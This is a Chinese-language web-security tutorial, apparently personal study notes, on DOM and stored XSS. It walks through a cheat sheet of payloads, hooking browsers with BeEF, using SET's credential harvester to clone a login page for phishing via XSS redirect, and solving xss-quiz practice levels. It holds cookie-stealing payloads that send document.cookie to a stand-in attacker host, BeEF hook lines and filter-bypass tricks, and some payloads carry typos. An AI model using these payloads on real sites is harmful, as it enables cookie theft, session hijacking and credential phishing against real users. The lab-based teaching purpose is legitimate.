<h5 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h5><p>​        DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>​        DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<p>​        <strong>HTML的标签都是节点</strong>，而这些节点组成了DOM的整体结构—<strong>节点树。</strong>通过HTML DOM，树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点，<strong>HTML DOM树结构</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/2461408-afb50bde75195453.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508" alt="img"></p>
<p>查看DMO XSS 选择一个类型进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210507911.png" alt="image-20200408210507911"></p>
<p>发现URL改变了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210534686.png" alt="image-20200408210534686"></p>
<p>在括号处更改值，例如改为123，然后回车，发现下拉选项框中出现了123</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210612217.png" alt="image-20200408210612217"></p>
<h4 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h4><h5 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe&gt;	ifranme 元素会创建包含另一个文档的内联框架(即行内框架)</span><br><span class="line">&lt;textarea&gt;	&lt;textarea&gt;标签定义多行的文本输入控件</span><br><span class="line">&lt;img&gt;		img元素像网页中嵌入一幅图像</span><br><span class="line">&lt;script&gt;	&lt;script&gt; 标签用于定义客户端脚本，如果JavaScript。</span><br><span class="line">			script 元素既可以包含脚本语句，也可以通过src 属性指向外部脚本文件</span><br><span class="line">			必须的 type 属性规定脚本的MIME类型。</span><br><span class="line">			JavaScript 的常见应用时图片操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure>

<h5 id="常用的JavaScript方法"><a href="#常用的JavaScript方法" class="headerlink" title="常用的JavaScript方法"></a>常用的JavaScript方法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert				alert()方法用于显示带有一条指定信息和一个按钮的警告框</span><br><span class="line">window.loaction		window.loaction对象用于获得当前页面的地址(URL),并把浏览器重定向到新的页面</span><br><span class="line">location.href		返回当前显示的文档的完整 URL</span><br><span class="line">onload				一张页面或一幅图像完成加载</span><br><span class="line">onsubmit			确认按钮被点击</span><br><span class="line">onerror				在加载文档或图片时发生错误</span><br></pre></td></tr></table></figure>

<h5 id="构造XSS脚本-1"><a href="#构造XSS脚本-1" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">弹窗警告</span><br><span class="line">此脚本实现弹窗提示，一般作为漏洞测试或者演示使用，类似sql注入漏洞测试中的&#39;单引号，一旦此脚本能执行，也就意味着后端服务器没有对特殊符号进行过滤&lt;&gt;&#x2F;&#39;这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;300 height&#x3D;300&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;http:&#x2F;&#x2F;www.baidu.com width&#x3D;0 height&#x3D;0&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(&quot;请移步到我们的新站&quot;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&quot;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;alert(&#39;xss&#39;);location.href&#x3D;&quot;http:&#x2F;&#x2F;www.127.0.0.1&#x2F;upload&#x2F;5.txt&quot;&lt;&#x2F;script&gt;</span><br><span class="line">这里结合了一些社工的思路，例如：通过网站内部私信的方式将其发送给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户，(克隆网站收集账户)</span><br><span class="line"></span><br><span class="line">访问恶意代码</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.qfedu.com&#x2F;xss.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">当别人看到script是脚本，脚本想想就是不好的，这样就可以巧妙运用图片标签了</span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src&#x3D;&quot;#&quot; onerror&#x3D;laert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;javascript:Falert(&#39;xss&#39;);&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;BeEF_IP:3000&#x2F;hook.js&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">绕开过滤的脚本</span><br><span class="line">大小写		&lt;ScrIpT&gt;alert(&#39;xss&#39;)&gt;&lt;&#x2F;ScrIpT&gt;</span><br><span class="line">字符编码采用URL、Base64等编码</span><br><span class="line"></span><br><span class="line">收集用户cookie</span><br><span class="line">打开新窗口并采用本地cookie访问目标网页。</span><br><span class="line">&lt;script&gt;window.open(&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie)&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;document.location&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php</span><br><span class="line">cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;img&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.hacker.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h4><h5 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h5><p>BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合Metasploit进行渗透；</p>
<p>BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单</p>
<p><a href="http://beefprohect.com/" target="_blank" rel="noopener">http://beefprohect.com/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">信息搜集：</span><br><span class="line">1、网络发现</span><br><span class="line">2、主机信息</span><br><span class="line">3、Cookie获取</span><br><span class="line">4、会话劫持</span><br><span class="line">5、键盘记录</span><br><span class="line">6、插件信息</span><br><span class="line"></span><br><span class="line">持久化控制：</span><br><span class="line">1、确认弹窗</span><br><span class="line">2、小窗口</span><br><span class="line">3、中间人</span><br><span class="line"></span><br><span class="line">社会工程：</span><br><span class="line">1、点击劫持</span><br><span class="line">2、弹窗警告</span><br><span class="line">3、虚假页面</span><br><span class="line">4、钓鱼网站</span><br><span class="line"></span><br><span class="line">渗透攻击：</span><br><span class="line">1、内网渗透</span><br><span class="line">2、Metasploit</span><br><span class="line">3、CSRF攻击</span><br><span class="line">4、DDOS攻击</span><br></pre></td></tr></table></figure>

<h5 id="BeEF基础"><a href="#BeEF基础" class="headerlink" title="BeEF基础"></a>BeEF基础</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动Apache和BeEF</span><br><span class="line">servic apache2 start</span><br></pre></td></tr></table></figure>

<h5 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h5><p>给了你地址和脚本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409200826972.png" alt="image-20200409200826972"></p>
<p>可以不在kali中访问，直接复制地址在本机上访问，如果在本机访问不能使用127.0.0.1，需要改为kali的ip，进行访问，账号是beef密码是你自己当时开启beef时设置的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200411202430272.png" alt="image-20200411202430272"></p>
<p>在线浏览和离线浏览没有用户访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409201153784.png" alt="image-20200409201153784"></p>
<p>当其他机器访问，我们这个也面时，就会执行XSS存储型漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072641793.png" alt="image-20200412072641793"></p>
<p>查看beef页面，这两台主机访问了我们的页面，成功将其ip抓取</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072738166.png" alt="image-20200412072738166"></p>
<p>查看beef的Current Browser模块下的Details子模块，Details子模块下的内容是浏览器的详细信息，里面包含了你当前浏览器的所有信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412073005775.png" alt="image-20200412073005775"></p>
<h5 id="查看Commands组件，里面是可能存在的攻击点"><a href="#查看Commands组件，里面是可能存在的攻击点" class="headerlink" title="查看Commands组件，里面是可能存在的攻击点"></a>查看Commands组件，里面是可能存在的攻击点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412101121579.png" alt="image-20200412101121579"></p>
<p>可以攻击一下查看是否能成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103408590.png" alt="image-20200412103408590"></p>
<p>上面是已经攻击完的，点击第三步，查看是否有cook值，页面返回cookie值说明页面攻击成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103459549.png" alt="image-20200412103459549"></p>
<h5 id="命令颜色"><a href="#命令颜色" class="headerlink" title="命令颜色"></a>命令颜色</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绿色	对目标主机生效并且不可见(不会被发现)</span><br><span class="line">橙色	对目标主机生效但可能可见(可能被发现)</span><br><span class="line">灰色	对目标主机未必生效(可验证下)</span><br><span class="line">红色	对目标主机不生效</span><br></pre></td></tr></table></figure>

<h4 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h4><h5 id="1、盗取用户信息原理"><a href="#1、盗取用户信息原理" class="headerlink" title="1、盗取用户信息原理"></a>1、盗取用户信息原理</h5><p>克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。</p>
<p>用户正常访问存在XSS漏洞的原始站点，原始站点存在XSS漏洞，被利用之后进行跳转，跳转到被利用的克隆站点，克隆站点和原始站点类似，但是只克隆了他的登录界面，这个时候用户会访问到克隆站点的登录界面，这个时候可能由于安全意识的薄弱，会输入用户的账号密码，这样克隆站点就成功地读取了用户的用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412162004695.png" alt="image-20200412162004695"></p>
<h5 id="2、setookit工具克隆网站"><a href="#2、setookit工具克隆网站" class="headerlink" title="2、setookit工具克隆网站"></a>2、setookit工具克隆网站</h5><p>这是本地dvwa的登录界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164221318.png" alt="image-20200412164221318"></p>
<p>使用setookit来克隆一个登陆界面，在kali命令行中输入setookit</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164519559.png" alt="image-20200412164519559"></p>
<p>输入1选择Social-Engineering Attacks</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164637047.png" alt="image-20200412164637047"></p>
<p>输入2选择Website Attack Vectors</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164710431.png" alt="image-20200412164710431"></p>
<p>输入3选择Credential Harvester Attack Method</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164751037.png" alt="image-20200412164751037"></p>
<p>输入2选择Site Cloner，这个时候就会弹出kali的ip，不用输入内容直接回车</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164821609.png" alt="image-20200412164821609"></p>
<p>在这个位置输入本地的登录界面地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164913334.png" alt="image-20200412164913334"></p>
<p>将红线位置地址输入到kali 上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165011200.png" alt="image-20200412165011200"></p>
<p>输入完回车，这就是已经复制成功了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165059221.png" alt="image-20200412165059221"></p>
<p>访问kali的ip地址查看是否有登录界面，成功克隆完成</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165149142.png" alt="image-20200412165149142"></p>
<h5 id="3、存储型xss跳转克隆网站"><a href="#3、存储型xss跳转克隆网站" class="headerlink" title="3、存储型xss跳转克隆网站"></a>3、存储型xss跳转克隆网站</h5><p>xss payload：<code>&lt;script&gt;window.location=&quot;跳转的URL&quot;&lt;/script&gt;</code> </p>
<h5 id="4、查看盗取账号和密码"><a href="#4、查看盗取账号和密码" class="headerlink" title="4、查看盗取账号和密码"></a>4、查看盗取账号和密码</h5><p>输入xss payload，上传，这里的ip地址改为kali的ip也就是跳转的ip</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171407361.png" alt="image-20200412171407361"></p>
<p>发现页面成功跳转，输入用户名和密码登录，登录的时候观察上方ip的变化</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171430380.png" alt="image-20200412171430380"></p>
<p>登录后，在kali中查看信息，发现成功获取了用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412170229771.png" alt="image-20200412170229771"></p>
<h4 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h4><h5 id="1、实验环境介绍"><a href="#1、实验环境介绍" class="headerlink" title="1、实验环境介绍"></a>1、实验环境介绍</h5><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p>
<p>一个日本安全研究员制作的XSS练习靶场</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192339311.png" alt="image-20200412192339311"></p>
<h5 id="2、html中文本标签b介绍"><a href="#2、html中文本标签b介绍" class="headerlink" title="2、html中文本标签b介绍"></a>2、html中文本标签b介绍</h5><p><code>&lt;b&gt;</code>标签规定粗体文本。</p>
<p><code>&lt;p&gt;</code>标签是段落，在段落中加入<code>&lt;b&gt;</code>标签，这是粗体文本的话加粗，普通文本不加粗</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192548959.png" alt="image-20200412192548959"></p>
<h5 id="3、探测XSS过程"><a href="#3、探测XSS过程" class="headerlink" title="3、探测XSS过程"></a>3、探测XSS过程</h5><p>1、构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面。</p>
<p>说白了就是随便输，爱输啥输啥</p>
<p>例如：156165161das651d65asd51</p>
<p>按F12使用箭头选中输入的文字</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412193629918.png" alt="image-20200412193629918"></p>
<h5 id="4、闭合文本标签利用XSS"><a href="#4、闭合文本标签利用XSS" class="headerlink" title="4、闭合文本标签利用XSS"></a>4、闭合文本标签利用XSS</h5><p>这是一个最简单Payload，这里可以直接输出domain。</p>
<p>因为<code>&lt;b&gt;</code>标签中加入<code>&lt;script&gt;</code>这个标签可以直接识别为JavaScript，那么就会弹出domain</p>
<p>1、简单的Payload：<code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412201400697.png" alt="image-20200412201400697"></p>
<p>提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202013079.png" alt="image-20200412202013079"></p>
<p>点击确定，返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202024254.png" alt="image-20200412202024254"></p>
<p>比较复杂的Payload，闭合方式的Payload。</p>
<p>首先闭合双引号然后闭合<code>&lt;b&gt;</code>标签，后面是<code>&lt;script&gt;</code>代码，前面会闭合后面会当做普通文本输出</p>
<p>HTML中的标签比如说<code>&lt;b&gt;</code>标签它以它开始之后是对应的文本，结束是<code>&lt;/b&gt;</code>，如果只有<code>&lt;/b&gt;</code>的话，它会当做简单的字符串处理，而不会当作一个标签处理。</p>
<p>2、闭合标签Payload：<code>&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>提交，点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202312416.png" alt="image-20200412202312416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202332477.png" alt="image-20200412202332477"></p>
<h4 id="标签属性中的XSS"><a href="#标签属性中的XSS" class="headerlink" title="标签属性中的XSS"></a>标签属性中的XSS</h4><h5 id="1、配置Chrome关闭XSS-Auditor"><a href="#1、配置Chrome关闭XSS-Auditor" class="headerlink" title="1、配置Chrome关闭XSS-Auditor"></a>1、配置Chrome关闭XSS-Auditor</h5><p><a href="http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome</a> –args –disable-xss-auditor</p>
<p>右键谷歌浏览器复制地址，在桌面新建快捷方式，将地址复制进去，在将–args –disable-xss-auditor复制进去，就可以</p>
<p>这个配置只有在chrome提交xss信息报错XSS错误的时候用。如果没有报错就不需要配置了</p>
<h5 id="2、属性中得到XSS发现"><a href="#2、属性中得到XSS发现" class="headerlink" title="2、属性中得到XSS发现"></a>2、属性中得到XSS发现</h5><p>技巧：ctrl+F 搜索特定的字符串</p>
<p>页面并没有显示我们输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412205955459.png" alt="image-20200412205955459"></p>
<p>按F12查看元素，可以直接使用箭头，然后选择输入框，也可以使用ctrl+f进行搜索</p>
<p>箭头这两处都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412210200170.png" alt="image-20200412210200170"></p>
<h5 id="3、属性中的XSS闭合引入script"><a href="#3、属性中的XSS闭合引入script" class="headerlink" title="3、属性中的XSS闭合引入script"></a>3、属性中的XSS闭合引入script</h5><p>闭合引号尖括号，引入script</p>
<p>当然也可以在双引号前面加上值</p>
<p><code>&quot;&gt;&lt;script&gt;alert(document.domuin);&lt;/script&gt;</code>将这段代码复制到输入框提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213252200.png" alt="image-20200412213252200"></p>
<p>提交，返回弹框点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213328524.png" alt="image-20200412213328524"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213356826.png" alt="image-20200412213356826"></p>
<h5 id="4、属性中的XSS闭合引入事件"><a href="#4、属性中的XSS闭合引入事件" class="headerlink" title="4、属性中的XSS闭合引入事件"></a>4、属性中的XSS闭合引入事件</h5><p>onmouseover意思就是当鼠标移动到输入框时弹出后面的内容</p>
<p>Payload：<code>&quot;onmouseover=alert(document.domain);&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214012337.png" alt="image-20200412214012337"></p>
<p>提交之后将鼠标放到输入框上，就会弹出内容，将鼠标放到篮框中就会弹出内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214101416.png" alt="image-20200412214101416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214152472.png" alt="image-20200412214152472"></p>
<h4 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h4><h5 id="1、HTML-select标签介绍"><a href="#1、HTML-select标签介绍" class="headerlink" title="1、HTML select标签介绍"></a>1、HTML select标签介绍</h5><p>select元素可以创建单选或多选菜单。</p>
<p><code>&lt;select&gt; 元素中的 &lt;option&gt;</code>标签用于定义列表中的可用选项</p>
<h5 id="2、表单介绍"><a href="#2、表单介绍" class="headerlink" title="2、表单介绍"></a>2、表单介绍</h5><p>HTML表单用于搜集不同类型的用户输入</p>
<p>可以使用浏览器查看提交的数据</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413092056335.png" alt="image-20200413092056335"></p>
<h5 id="3、Burpsuite测试XSS"><a href="#3、Burpsuite测试XSS" class="headerlink" title="3、Burpsuite测试XSS"></a>3、Burpsuite测试XSS</h5><p>使用burpsuite截取HTTP请求，修改提交参数</p>
<p>可以在蓝线处进行修改写入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093804378.png" alt="image-20200413093804378"></p>
<h5 id="4、闭合触发XSS"><a href="#4、闭合触发XSS" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p>这里不管是闭合还是不闭合都可以弹出xss，都可以通关</p>
<p>蓝线处可以加<code>&lt;/option&gt;</code>来闭合前面的列表也可以不用闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093933071.png" alt="image-20200413093933071"></p>
<p>点击go查看页面显示。</p>
<p>页面并没有返回<strong>Congratulations!!</strong> 通关信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094042891.png" alt="image-20200413094042891"></p>
<p>再点回Raw，复制链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094159681.png" alt="image-20200413094159681"></p>
<p>点击Show response borwser，复制copy连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094233493.png" alt="image-20200413094233493"></p>
<p>复制完连接去浏览器打开，成功出现弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094259472.png" alt="image-20200413094259472"></p>
<p>确定返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094344690.png" alt="image-20200413094344690"></p>
<h4 id="隐藏参数中的XSS"><a href="#隐藏参数中的XSS" class="headerlink" title="隐藏参数中的XSS"></a>隐藏参数中的XSS</h4><h5 id="1、HTML表单隐藏参数介绍"><a href="#1、HTML表单隐藏参数介绍" class="headerlink" title="1、HTML表单隐藏参数介绍"></a>1、HTML表单隐藏参数介绍</h5><p>隐藏域就是用来收集或者发送消息的不可见元素，对于网页的访问者来说，隐藏于是看不见的。表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上。</p>
<p>代码格式：<code>&lt;input type=&quot;hidden&quot; name=&quot;...&quot; value=&quot;...&quot;&gt;</code></p>
<h5 id="2、Burpsutie抓包测试"><a href="#2、Burpsutie抓包测试" class="headerlink" title="2、Burpsutie抓包测试"></a>2、Burpsutie抓包测试</h5><p>使用burpsutie进行抓包，截取提交的HTTP请求。</p>
<p>使用浏览器审计和burp对照</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413101509383.png" alt="image-20200413101509383"></p>
<h5 id="3、HTML中svg介绍"><a href="#3、HTML中svg介绍" class="headerlink" title="3、HTML中svg介绍"></a>3、HTML中svg介绍</h5><p>SVG意为可缩放矢量图形（Scalable Vector Graphics）</p>
<p>SVG使用XML格式定义图像。</p>
<p>SVG文件可通过以下标签嵌入HTML文档：<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>。也可以使用svg标签插入</p>
<p>这里可以是斜杠也可以是空格</p>
<p><code>&lt;svf/事件=&quot;&quot;&gt;</code></p>
<h5 id="4、闭合触发XSS-1"><a href="#4、闭合触发XSS-1" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p><code>&quot;&gt;</code>闭合属性，使用<code>&lt;svg onload=alert(document.domain);&gt;</code>弹出对应的内容，使用<code>%0a</code>替换空格，来讲标签之间有一个间隙</p>
<p>Payload：<code>&quot;&gt;&lt;svg onload=alert(document.domain);&gt;%0a</code></p>
<p>经过测试，在p1，p2后面输入xss代码，xss代码都会被网页直接输出，只有在p3的时候xss代码才没有回显到网页上。查看源代码发现，value显示了我们之前提交的内容，script脚本被加载到<code>type=&quot;hidden&quot;</code>和<code>value=&quot;hackme&quot;</code>当中，这时候我们可以使用闭合方式或者其他方式进行对应的测试。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103113469.png" alt="image-20200413103113469"></p>
<p>我们使用闭合查看是否能被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103928497.png" alt="image-20200413103928497"></p>
<p>页面成功被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103956585.png" alt="image-20200413103956585"></p>
<p>点击确定，页面返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104028973.png" alt="image-20200413104028973"></p>
<p>上面说的是svg但这里实验的是script，当然svg也可以只是没必要非要用svg</p>
<p>演示，进行抓包，将svg的Payload复制到p3的hackme后面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104605249.png" alt="image-20200413104605249"></p>
<p>Forward放行，查看页面是否返回，同样可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104628621.png" alt="image-20200413104628621"></p>
<p>返回了Congratulations!! ，这样也行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104657566.png" alt="image-20200413104657566"></p>
<h4 id="限制输入长度的XSS"><a href="#限制输入长度的XSS" class="headerlink" title="限制输入长度的XSS"></a>限制输入长度的XSS</h4><h5 id="1、HTML表单文本框介绍"><a href="#1、HTML表单文本框介绍" class="headerlink" title="1、HTML表单文本框介绍"></a>1、HTML表单文本框介绍</h5><p>HTML表单用于搜索不用类型的用户输入，表单元素指的是不同类型的input元素、复选框，单选按钮，提交按钮等，text定义常规文本输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">属性介绍：</span><br><span class="line">value属性规定输入字段的初始值</span><br><span class="line">readonly属性规定输入字段为只读（不能修改）。</span><br><span class="line">disabled属性规定输入字段是禁用的，被禁用的元素是不可用的和不可点击的。被禁用的元素不会被提交</span><br><span class="line">size属性规定输入字段尺寸（以字符计）</span><br><span class="line">maxlength属性规定输入字段允许的最大长度</span><br><span class="line">如设置maxlength属性，则输入控件不会接受超过所允许数的字符</span><br><span class="line">该属性不会提供任何反馈，如果需要提醒用户，必须编写JavaScript代码</span><br></pre></td></tr></table></figure>

<h5 id="2、XSS-Payload长度计算"><a href="#2、XSS-Payload长度计算" class="headerlink" title="2、XSS Payload长度计算"></a>2、XSS Payload长度计算</h5><p>使用Python内置函数len(字符串)计算对应的字节数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111230387.png" alt="image-20200413111230387"></p>
<h5 id="3、浏览器审查工具修改源码"><a href="#3、浏览器审查工具修改源码" class="headerlink" title="3、浏览器审查工具修改源码"></a>3、浏览器审查工具修改源码</h5><p>当我们一直按住1的时候发现输入到15个长度就不能输入了，F12查看代码，发现maxlength限制了字符的长度是15。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111547950.png" alt="image-20200413111547950"></p>
<p>我们可以进行更改，将15改为150，这样就可以输入更多的字符了，当然长度不能超过150</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111727842.png" alt="image-20200413111727842"></p>
<h5 id="4、Payload触发XSS漏洞"><a href="#4、Payload触发XSS漏洞" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>更改长度之后我们插入xss，闭合<code>&lt;input&gt;</code>，<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
